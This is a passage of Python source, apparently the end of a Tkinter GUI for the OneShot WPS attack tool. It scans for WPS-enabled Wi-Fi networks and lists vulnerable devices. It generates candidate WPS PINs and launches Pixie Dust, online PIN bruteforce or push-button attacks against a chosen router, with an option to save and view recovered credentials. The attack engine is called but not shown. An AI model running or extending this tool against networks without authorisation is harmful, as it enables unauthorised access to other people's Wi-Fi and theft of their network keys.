            elif s == 'WEP': s = 'WPA2' if r.group(1) == 'RSN' else 'WPA' if r.group(1) == 'WPA' else s
            elif s == 'WPA': s = 'WPA/WPA2' if r.group(1) == 'RSN' else s
            elif s == 'WPA2': s = 'WPA/WPA2' if r.group(1) == 'WPA' else s
            nets[-1]['Security type'] = s
        def h_wps(l, r, nets): nets[-1]['WPS'] = r.group(1)
        def h_wpsl(l, r, nets):
            if int(r.group(1), 16): nets[-1]['WPS locked'] = True
        def h_model(l, r, nets): nets[-1]['Model'] = codecs.decode(r.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
        def h_modelnum(l, r, nets): nets[-1]['Model number'] = codecs.decode(r.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
        def h_dev(l, r, nets): nets[-1]['Device name'] = codecs.decode(r.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        r = subprocess.run('iw dev {} scan'.format(self.interface), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = r.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): h_net,
            re.compile(r'SSID: (.*)'): h_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): h_level,
            re.compile(r'(capability): (.+)'): h_sec,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): h_sec,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): h_sec,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): h_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): h_wpsl,
            re.compile(r' [*] Model: (.*)'): h_model,
            re.compile(r' [*] Model Number: (.*)'): h_modelnum,
            re.compile(r' [*] Device name: (.*)'): h_dev,
        }
        for line in lines:
            if line.startswith('command failed:'): return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                m = re.match(regexp, line)
                if m: handler(line, m, networks)
        networks = [n for n in networks if n.get('WPS')]
        if not networks: return False
        networks.sort(key=lambda x: x.get('Level', 0), reverse=True)
        return {(i + 1): net for i, net in enumerate(networks)}


def ifaceUp(iface, down=False):
    return subprocess.run('ip link set {} {}'.format(iface, 'down' if down else 'up'), shell=True).returncode == 0


# ======================================================================
# GUI
# ======================================================================

class PINDialog(tk.Toplevel):
    def __init__(self, parent, pins, bssid):
        super().__init__(parent)
        self.title("Generated PINs - {}".format(bssid))
        self.geometry("550x400")
        self.resizable(True, True)
        self.selected_pin = None

        f = ttk.Frame(self, padding=10)
        f.pack(fill=tk.BOTH, expand=True)

        cols = ('pin', 'name')
        t = ttk.Treeview(f, columns=cols, show='headings', height=15)
        t.heading('pin', text='WPS PIN'); t.heading('name', text='Algorithm')
        t.column('pin', width=120, anchor=tk.CENTER); t.column('name', width=380)
        vs = ttk.Scrollbar(f, orient=tk.VERTICAL, command=t.yview)
        t.configure(yscrollcommand=vs.set)
        t.pack(side=tk.LEFT, fill=tk.BOTH, expand=True); vs.pack(side=tk.RIGHT, fill=tk.Y)

        for p in pins: t.insert('', tk.END, values=(p['pin'], p['name']))
        t.bind('<Double-1>', lambda e: self._pick(t))

        btnf = ttk.Frame(f)
        btnf.pack(fill=tk.X, pady=5)
        ttk.Button(btnf, text="Use Selected", command=lambda: self._pick(t)).pack(side=tk.LEFT, padx=5)
        ttk.Button(btnf, text="Cancel", command=self.destroy).pack(side=tk.RIGHT, padx=5)

    def _pick(self, tree):
        sel = tree.selection()
        if sel:
            self.selected_pin = tree.item(sel[0], 'values')[0]
            self.destroy()


class MessagesDialog(tk.Toplevel):
    def __init__(self, parent, title, messages):
        super().__init__(parent)
        self.title(title)
        self.geometry("600x300")
        f = ttk.Frame(self, padding=10)
        f.pack(fill=tk.BOTH, expand=True)
        t = tk.Text(f, wrap=tk.WORD, font=('Consolas', 9))
        vs = ttk.Scrollbar(f, orient=tk.VERTICAL, command=t.yview)
        t.configure(yscrollcommand=vs.set)
        t.pack(side=tk.LEFT, fill=tk.BOTH, expand=True); vs.pack(side=tk.RIGHT, fill=tk.Y)
        for m in messages: t.insert(tk.END, m + '\n')
        t.configure(state=tk.DISABLED)


class OneShotGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("OneShot WPS Tool v0.0.2")
        self.root.geometry("960x780")
        self.root.minsize(800, 600)
        self.root.option_add('*tearOff', False)

        self.companion = None
        self.worker_thread = None
        self.running = False
        self.networks_dict = {}
        self.generator = WPSpin()
        self.vuln_list = []
        self._load_vuln_list()

        self.log_queue = queue.Queue()

        self._build_menu()
        self._build_ui()
        self._setup_styles()

        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        self.root.after(100, self._process_log_queue)
        self.log("[i] OneShot WPS GUI started. Configure interface & target, then attack.")

    def _setup_styles(self):
        style = ttk.Style()
        style.configure('Header.TLabel', font=('Segoe UI', 10, 'bold'))
        style.configure('Success.TLabel', foreground='#006600')
        style.configure('Error.TLabel', foreground='#cc0000')
        style.configure('Info.TLabel', foreground='#0055aa')

    def _load_vuln_list(self):
        try:
            fn = os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt'
            with open(fn, encoding='utf-8') as f: self.vuln_list = f.read().splitlines()
        except: self.vuln_list = []

    def _build_menu(self):
        mb = tk.Menu(self.root)
        self.root.config(menu=mb)

        file_menu = tk.Menu(mb)
        mb.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Save Log As...", command=self._save_log)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self._on_close)

        scan_menu = tk.Menu(mb)
        mb.add_cascade(label="Scan", menu=scan_menu)
        scan_menu.add_command(label="Scan Networks", command=self._scan_networks)
        scan_menu.add_command(label="Clear Network List", command=self._clear_networks)

        tools_menu = tk.Menu(mb)
        mb.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Generate PINs for BSSID...", command=self._show_generate_pins)
        tools_menu.add_command(label="View Saved Credentials", command=self._view_saved)
        tools_menu.add_separator()
        tools_menu.add_command(label="View Vulnerable Devices List", command=self._view_vuln_list)

        help_menu = tk.Menu(mb)
        mb.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self._show_about)

    def _save_log(self):
        fn = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files","*.txt"),("All files","*.*")])
        if fn:
            try:
                with open(fn, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get(1.0, tk.END))
                messagebox.showinfo("Saved", "Log saved to {}".format(fn))
            except Exception as e: messagebox.showerror("Error", str(e))

    def _clear_networks(self):
        for i in self.net_tree.get_children(): self.net_tree.delete(i)
        self.networks_dict = {}
        self.log("[i] Network list cleared")

    def _view_saved(self):
        rf = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.txt'
        if os.path.exists(rf):
            with open(rf, encoding='utf-8') as f: data = f.read()
            MessagesDialog(self.root, "Saved Credentials", data.splitlines())
        else:
            messagebox.showinfo("No Data", "No saved credentials found.")

    def _view_vuln_list(self):
        if self.vuln_list:
            MessagesDialog(self.root, "Vulnerable Devices (vulnwsc.txt)", self.vuln_list)
        else:
            messagebox.showinfo("No Data", "vulnwsc.txt not found or empty.")

    def _show_about(self):
        messagebox.showinfo("About OneShot WPS GUI",
            "OneShot WPS Tool v0.0.2\n\n"
            "Original CLI by rofl0r, modded by drygdryg\n"
            "GUI wrapper by OneShot community\n\n"
            "WPS PIN generation & WiFi WPS attack tool.\n"
            "Requires: wpa_supplicant, iw, pixiewps, ip")

    def _build_ui(self):
        outer = ttk.Frame(self.root, padding=8)
        outer.pack(fill=tk.BOTH, expand=True)

        # ----- Section: Target Configuration -----
        cfg = ttk.LabelFrame(outer, text="Target Configuration", padding=8)
        cfg.pack(fill=tk.X, pady=2)

        ttk.Label(cfg, text="Wi-Fi Interface:").grid(row=0, column=0, sticky=tk.W, padx=3)
        self.iface_var = tk.StringVar(value="wlan0")
        ttk.Entry(cfg, textvariable=self.iface_var, width=14).grid(row=0, column=1, padx=3, sticky=tk.W)

        ttk.Label(cfg, text="Target BSSID (MAC):").grid(row=0, column=2, sticky=tk.W, padx=3)
        self.bssid_var = tk.StringVar()
        ttk.Entry(cfg, textvariable=self.bssid_var, width=20, font=('Consolas', 9)).grid(row=0, column=3, padx=3, sticky=tk.W)

        self.scan_btn = ttk.Button(cfg, text="Scan Networks", command=self._scan_networks)
        self.scan_btn.grid(row=0, column=4, padx=8)

        ttk.Separator(cfg, orient=tk.HORIZONTAL).grid(row=1, column=0, columnspan=6, sticky=tk.EW, pady=4)

        ttk.Label(cfg, text="WPS PIN:").grid(row=2, column=0, sticky=tk.W, padx=3)
        self.pin_var = tk.StringVar()
        ttk.Entry(cfg, textvariable=self.pin_var, width=20, font=('Consolas', 9)).grid(row=2, column=1, padx=3, sticky=tk.W)

        self.gen_pin_btn = ttk.Button(cfg, text="Generate Suggested PINs", command=self._show_generate_pins)
        self.gen_pin_btn.grid(row=2, column=2, padx=3)

        ttk.Label(cfg, text="Vuln List:").grid(row=2, column=3, sticky=tk.W, padx=3)
        self.vuln_list_btn = ttk.Button(cfg, text="Load...", command=self._load_custom_vuln_list)
        self.vuln_list_btn.grid(row=2, column=4, sticky=tk.W, padx=3)

        # ----- Section: Attack Mode -----
        mode_f = ttk.LabelFrame(outer, text="Attack Mode", padding=8)
        mode_f.pack(fill=tk.X, pady=2)

        self.attack_mode = tk.StringVar(value="pixie")

        modes_frame = ttk.Frame(mode_f)
        modes_frame.pack(fill=tk.X)

        ttk.Radiobutton(modes_frame, text="Pixie Dust Attack", variable=self.attack_mode, value="pixie",
                         command=self._on_mode_change).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(modes_frame, text="Online Bruteforce", variable=self.attack_mode, value="bruteforce",
                         command=self._on_mode_change).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(modes_frame, text="Push Button Connect (PBC)", variable=self.attack_mode, value="pbc",
                         command=self._on_mode_change).pack(side=tk.LEFT, padx=10)

        opts_frame = ttk.LabelFrame(outer, text="Options", padding=8)
        opts_frame.pack(fill=tk.X, pady=2)

        # Row 0
        self.delay_var = tk.StringVar(value="0")
        ttk.Label(opts_frame, text="Delay (seconds):").grid(row=0, column=0, sticky=tk.W, padx=3)
        ttk.Entry(opts_frame, textvariable=self.delay_var, width=6).grid(row=0, column=1, sticky=tk.W, padx=3)

        self.verbose_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(opts_frame, text="Verbose Output", variable=self.verbose_var).grid(row=0, column=2, padx=8, sticky=tk.W)

        self.save_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(opts_frame, text="Save Credentials on Success", variable=self.save_var).grid(row=0, column=3, padx=8, sticky=tk.W)

        self.loop_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(opts_frame, text="Loop Mode", variable=self.loop_var).grid(row=0, column=4, padx=8, sticky=tk.W)

        # Row 1
        self.force_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(opts_frame, text="Pixie Force (full range)", variable=self.force_var).grid(row=1, column=0, padx=8, sticky=tk.W)

        self.show_cmd_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(opts_frame, text="Show Pixiewps Command", variable=self.show_cmd_var).grid(row=1, column=1, padx=8, sticky=tk.W, columnspan=2)

        self.reverse_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(opts_frame, text="Reverse Scan Order", variable=self.reverse_var).grid(row=1, column=2, padx=8, sticky=tk.W, columnspan=2)

        self.mtk_var = tk.BooleanVar(value=False)
        self.iface_down_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(opts_frame, text="MTK WiFi Driver", variable=self.mtk_var).grid(row=1, column=3, padx=8, sticky=tk.W)
        ttk.Checkbutton(opts_frame, text="Bring Interface Down on Exit", variable=self.iface_down_var).grid(row=1, column=4, padx=8, sticky=tk.W)

        # ----- Section: Action Buttons -----
        act_f = ttk.Frame(outer)
        act_f.pack(fill=tk.X, pady=4)

        self.start_btn = ttk.Button(act_f, text="START ATTACK", command=self._start_attack, width=20)
        self.start_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = ttk.Button(act_f, text="STOP", command=self._stop_attack, width=10, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        # ----- Section: Network List -----
        net_f = ttk.LabelFrame(outer, text="Available WPS Networks", padding=5)
        net_f.pack(fill=tk.BOTH, expand=True, pady=2)

        cols = ('num', 'bssid', 'essid', 'sec', 'pwr', 'locked', 'device', 'model')
        self.net_tree = ttk.Treeview(net_f, columns=cols, show='headings', height=6)
        self.net_tree.heading('num', text='#'); self.net_tree.heading('bssid', text='BSSID')
        self.net_tree.heading('essid', text='ESSID'); self.net_tree.heading('sec', text='Security')
        self.net_tree.heading('pwr', text='PWR'); self.net_tree.heading('locked', text='Locked')
        self.net_tree.heading('device', text='Device Name'); self.net_tree.heading('model', text='Model')
        self.net_tree.column('num', width=28, anchor=tk.CENTER); self.net_tree.column('bssid', width=140)
        self.net_tree.column('essid', width=150); self.net_tree.column('sec', width=70, anchor=tk.CENTER)
        self.net_tree.column('pwr', width=36, anchor=tk.CENTER); self.net_tree.column('locked', width=48, anchor=tk.CENTER)
        self.net_tree.column('device', width=130); self.net_tree.column('model', width=140)
        vs = ttk.Scrollbar(net_f, orient=tk.VERTICAL, command=self.net_tree.yview)
        self.net_tree.configure(yscrollcommand=vs.set)
        self.net_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True); vs.pack(side=tk.RIGHT, fill=tk.Y)
        self.net_tree.bind('<<TreeviewSelect>>', self._on_network_select)
        self.net_tree.bind('<Double-1>', lambda e: self._on_network_doubleclick())

        # ----- Section: Output -----
        out_f = ttk.LabelFrame(outer, text="Output Log", padding=5)
        out_f.pack(fill=tk.BOTH, expand=True, pady=2)

        self.log_text = tk.Text(out_f, wrap=tk.WORD, height=10, font=('Consolas', 9),
                                bg='white', fg='black', relief=tk.SUNKEN, borderwidth=2)
        vs2 = ttk.Scrollbar(out_f, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=vs2.set)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True); vs2.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.insert(tk.END, "[i] Ready.\n"); self.log_text.see(tk.END)

        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        sb = ttk.Label(outer, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W, padding=2)
        sb.pack(fill=tk.X, pady=1)

    def _on_mode_change(self):
        mode = self.attack_mode.get()
        self.log("[i] Attack mode changed to: {}".format(
            {'pixie': 'Pixie Dust', 'bruteforce': 'Online Bruteforce', 'pbc': 'Push Button Connect'}.get(mode, mode)))

    def _load_custom_vuln_list(self):
        fn = filedialog.askopenfilename(title="Select Vulnerable Devices List", filetypes=[("Text files","*.txt"),("All files","*.*")])
        if fn:
            try:
                with open(fn, encoding='utf-8') as f: self.vuln_list = f.read().splitlines()
                self.log("[i] Loaded vulnerable devices list: {} entries".format(len(self.vuln_list)))
            except Exception as e: messagebox.showerror("Error", str(e))

    def log(self, msg):
        self.log_queue.put(msg)

    def _process_log_queue(self):
        try:
            while True:
                msg = self.log_queue.get_nowait()
                ts = datetime.now().strftime("%H:%M:%S")
                self.log_text.insert(tk.END, "[{}] {}\n".format(ts, msg))
                self.log_text.see(tk.END)
        except queue.Empty: pass
        finally: self.root.after(100, self._process_log_queue)

    def _on_close(self):
        if self.running:
            if not messagebox.askyesno("Confirm", "An attack is running. Stop and exit?"): return
            self._stop_attack()
        if self.companion:
            try: self.companion.cleanup()
            except: pass
        if self.mtk_var.get():
            try:
                d = Path("/dev/wmtWifi")
                if d.is_char_device(): d.write_text("0")
            except: pass
        if self.iface_down_var.get(): ifaceUp(self.iface_var.get(), down=True)
        self.root.destroy()

    def _scan_networks(self):
        iface = self.iface_var.get().strip()
        if not iface: messagebox.showerror("Error", "Interface is required"); return
        self.scan_btn.config(state=tk.DISABLED, text="Scanning...")
        self.log("[*] Scanning for WPS networks on {}...".format(iface))
        self.status_var.set("Scanning...")
        self.root.update()

        def worker():
            try:
                s = WiFiScanner(iface, self.vuln_list)
                nets = s.iw_scanner()
                self.root.after(0, self._display_scan_results, nets)
            except Exception as e:
                self.root.after(0, self.log, "[!] Scan error: {}".format(e))
                self.root.after(0, self._scan_done)

        threading.Thread(target=worker, daemon=True).start()

    def _scan_done(self):
        self.scan_btn.config(state=tk.NORMAL, text="Scan Networks")
        self.status_var.set("Ready")

    def _display_scan_results(self, networks):
        for i in self.net_tree.get_children(): self.net_tree.delete(i)
        self.networks_dict = {}
        self._scan_done()
        if not networks:
            self.log("[-] No WPS networks found.")
            return
        self.log("[+] Found {} WPS network(s)".format(len(networks)))
        items = list(networks.items())
        if self.reverse_var.get(): items = items[::-1]
        for n, net in items:
            bssid = net['BSSID']
            essid = net.get('ESSID', 'HIDDEN') or 'HIDDEN'
            sec = net['Security type']
            pwr = str(net.get('Level', '?'))
            locked = 'LOCKED' if net.get('WPS locked') else ''
            dev = net.get('Device name', '')
            mdl = '{} {}'.format(net.get('Model', ''), net.get('Model number', '')).strip()
            tags = ()
            if locked: tags = ('locked',)
            self.net_tree.insert('', tk.END, values=(str(n), bssid, essid, sec, pwr, locked, dev, mdl), tags=tags)
            self.networks_dict[str(n)] = bssid
        self.net_tree.tag_configure('locked', foreground='red')

    def _on_network_select(self, event):
        sel = self.net_tree.selection()
        if sel:
            v = self.net_tree.item(sel[0], 'values')
            if v: self.bssid_var.set(v[1])

    def _on_network_doubleclick(self):
        bssid = self.bssid_var.get().strip()
        if bssid:
            self._show_generate_pins_for(bssid)

    def _show_generate_pins(self):
        bssid = self.bssid_var.get().strip()
        if not bssid: messagebox.showerror("Error", "Enter a BSSID first"); return
        self._show_generate_pins_for(bssid)

    def _show_generate_pins_for(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if not pins: pins = self.generator.getAll(bssid)
        if not pins: messagebox.showinfo("PINs", "No PINs generated for this BSSID"); return
        dlg = PINDialog(self.root, pins, bssid)
        self.root.wait_window(dlg)
        if dlg.selected_pin:
            self.pin_var.set(dlg.selected_pin)
            self.log("[i] Selected PIN: {}".format(dlg.selected_pin))

    def _start_attack(self):
        iface = self.iface_var.get().strip()
        bssid = self.bssid_var.get().strip()
        mode = self.attack_mode.get()

        if not iface: messagebox.showerror("Error", "Interface is required"); return
        if not bssid and mode != 'pbc':
            if mode == 'bruteforce':
                messagebox.showerror("Error", "BSSID is required for bruteforce"); return
            if mode == 'pixie':
                messagebox.showerror("Error", "BSSID is required for Pixie Dust attack"); return

        if os.geteuid() != 0:
            messagebox.showerror("Error", "This tool must be run as root (sudo)"); return

        if self.mtk_var.get():
            try:
                d = Path("/dev/wmtWifi")
                if not d.is_char_device():
                    messagebox.showerror("Error", "/dev/wmtWifi not found"); return
                d.chmod(0o644); d.write_text("1")
                time.sleep(1)
            except Exception as e: messagebox.showerror("Error", "MTK: {}".format(e)); return

        if not ifaceUp(iface):
            messagebox.showerror("Error", 'Cannot bring up interface "{}"'.format(iface)); return

        self.running = True
        self.start_btn.config(state=tk.DISABLED); self.stop_btn.config(state=tk.NORMAL)
        self.scan_btn.config(state=tk.DISABLED); self.gen_pin_btn.config(state=tk.DISABLED)
        delay_s = self.delay_var.get().strip()
        delay = float(delay_s) if delay_s else None

        mode_names = {'pixie': 'Pixie Dust', 'bruteforce': 'Online Bruteforce', 'pbc': 'PBC'}
        self.log("[*] === {} attack started ===".format(mode_names.get(mode, mode)))
        self.log("[*] Interface: {} | BSSID: {} | PIN: {}".format(iface, bssid or '(any)', self.pin_var.get() or '(auto)'))
        self.status_var.set("Running {}...".format(mode_names.get(mode, mode)))

        def worker():
            try:
                companion = Companion(iface, save_result=self.save_var.get(),
                                      print_debug=self.verbose_var.get(), bssid=bssid, log_cb=self.log)
                self.companion = companion
                if mode == 'pixie':
                    pin = self.pin_var.get().strip() or None
                    companion.single_connection(bssid, pin=pin, pixiemode=True,
                                                showpixiecmd=self.show_cmd_var.get(), pixieforce=self.force_var.get())
                elif mode == 'bruteforce':
                    pin = self.pin_var.get().strip() or None
                    companion.smart_bruteforce(bssid, pin, delay)
                elif mode == 'pbc':
                    companion.single_connection(bssid, pbc_mode=True)
            except Exception as e:
                self.log("[!] Error: {}".format(e))
            finally:
                if self.companion:
                    try: self.companion.cleanup()
                    except: pass
                    self.companion = None
                self.root.after(0, self._attack_done)

        threading.Thread(target=worker, daemon=True).start()

    def _stop_attack(self):
        if self.companion: self.companion.abort()
        self.log("[!] Aborting attack...")
        self.status_var.set("Aborting...")

    def _attack_done(self):
        self.running = False
        self.start_btn.config(state=tk.NORMAL); self.stop_btn.config(state=tk.DISABLED)
        self.scan_btn.config(state=tk.NORMAL); self.gen_pin_btn.config(state=tk.NORMAL)
        self.status_var.set("Ready")
        self.log("[i] Attack finished.\n")
        if self.mtk_var.get():
            try:
                d = Path("/dev/wmtWifi")
                if d.is_char_device(): d.write_text("0")
            except: pass


def main():
    if len(sys.argv) > 1 and sys.argv[1] in ('-u', '--update', 'update'):
        _dir = os.path.dirname(os.path.abspath(__file__))
        print("[*] Updating OneShot in {}...".format(_dir))
        r = subprocess.run(['git', 'pull'], cwd=_dir, capture_output=True, text=True)
        print(r.stdout + r.stderr)
        sys.exit(0 if r.returncode == 0 else 1)

    if sys.hexversion < 0x03060F0:
        print("Python 3.6+ required"); sys.exit(1)
    root = tk.Tk()
    app = OneShotGUI(root)
    root.mainloop()


if __name__ == '__main__':
    main()
